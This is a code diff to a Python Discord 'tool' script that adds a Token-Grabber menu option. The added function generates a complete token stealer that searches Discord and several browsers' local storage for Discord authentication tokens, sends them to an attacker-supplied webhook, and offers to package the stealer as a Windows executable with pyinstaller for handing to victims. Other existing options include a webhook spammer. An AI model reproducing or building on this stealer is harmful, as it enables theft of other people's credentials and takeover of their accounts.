@@ -124,8 +124,104 @@ def HiddenLink():
 
 def HELP():
     os.system("CLS")
-    print(Fore.RED + "How to find the ID?", Fore.GREEN + "\nGo to the discord settings, then to advanced there you turn on the developer mode. If you now right click on a channel you can copy the id.\n")
+    print(Fore.RED + "How to find the ID?\n", Fore.GREEN + "Go to the discord settings, then to advanced there you turn on the developer mode. If you now right click on a channel you can copy the id.\n")
     print(Fore.RED + "How to find my Discord token?", Fore.GREEN + ("\nStart the 3 function of the DiscordTool. Now you can see a lot of tokens. Important: not all tokens work. You can see if a token is working using the 4 feature of the DiscordTool."))
+
+def TokenGrabber():
+    webhooklink = input("Enter Webhook URL: ")
+    file = open("TokenGrabber.py", "w")
+    file.write("#Created by https://github.com/RealMepon/DiscordTool\n")
+    file.write("""
+import os
+import re
+import json
+
+from urllib.request import Request, urlopen
+
+# your webhook URL
+WEBHOOK_URL = 'WEBHOOK HERE'
+
+# mentions you when you get a hit
+PING_ME = False
+
+def find_tokens(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+
+    for file_name in os.listdir(path):
+        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+            continue
+
+        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                for token in re.findall(regex, line):
+                    tokens.append(token)
+    return tokens
+
+def main():
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '@everyone' if PING_ME else ''
+
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += f'\n**{platform}**\n```\n'
+
+        tokens = find_tokens(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            message += 'No tokens found.\n'
+
+        message += '```'
+
+    headers = {
+        'Content-Type': 'application/json',
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+    }
+
+    payload = json.dumps({'content': message})
+
+    try:
+        req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+        urlopen(req)
+    except:
+        pass
+
+if __name__ == '__main__':
+    main()""".replace("WEBHOOK HERE", webhooklink))
+    os.system("CLS")
+    print(Fore.GREEN + "File created succesfully (Name: TokenGrabber.py)")
+    print("Wanna make file executable(y|n): ")
+    executable = input()
+    if executable == "y" or executable == "Y":
+        os.system("pyinstaller --onefile TokenGrabber.py")
+        os.system("CLS")
+        print(Fore.GREEN + "TokenGrabber.exe was created successfully (Path: DiscordTool/dist/TokenGrabber.exe)")
+        time.sleep(4)
+        exit()
+    else:
+        os.system("CLS")
+        print(Fore.RED + "Program will close...")
+        time.sleep(3)
+        exit()
+
 def find_tokens(path):
     path += '\\Local Storage\\leveldb'
     tokenCount = 1
@@ -176,7 +272,7 @@ def main():
         message += '```'
 
 print(Fore.YELLOW + "\nFeatures:")
-print(Fore.BLUE + "BuggyMessage[1]",Fore.BLUE + "\nMessageAsImage[2]",Fore.BLUE + "\nGetYourOwnDiscordToken[3]",Fore.BLUE + "\nCheckDiscordToken[4]",Fore.BLUE + "\nFake stream[5]",Fore.BLUE + "\nSend empty message[6]", Fore.BLUE + "\nNiroGenerator(xD)[7]",Fore.BLUE + "\nWebhookSpammer[8]", Fore.BLUE + "\nHidden Link[9]",Fore.GREEN + "\nHELP[10]")
+print(Fore.BLUE + "BuggyMessage" +Fore.RED +  "[1]",Fore.BLUE + "\nMessageAsImage"+Fore.RED + "[2]",Fore.BLUE + "\nGetYourOwnDiscordToken"+Fore.RED + "[3]",Fore.BLUE + "\nCheckDiscordToken"+Fore.RED +  "[4]",Fore.BLUE + "\nFake stream"+Fore.RED + "[5]",Fore.BLUE + "\nSend empty message"+Fore.RED+"[6]", Fore.BLUE + "\nNiroGenerator(xD)"+Fore.RED+"[7]",Fore.BLUE + "\nWebhookSpammer"+Fore.RED+"[8]", Fore.BLUE + "\nHidden Link"+Fore.RED+"[9]",Fore.BLUE+"\nToken-Grabber"+Fore.RED+"[10]",Fore.LIGHTGREEN_EX + "\nHELP[11]")
 key = input("\nEnter Number: ")
 if key == "1":
     os.system("CLS")
@@ -235,6 +331,12 @@ if key == "9":
     exit()
 
 if key == "10":
+    os.system("CLS")
+    TokenGrabber()
+    time.sleep(4)
+    exit()
+
+if key == "11":
     HELP()
     time.sleep(30)
     exit()
@@ -242,10 +344,3 @@ else:
     print("Invalid Key")
     time.sleep(5)
     exit()
-
-
-
-
-
-
-
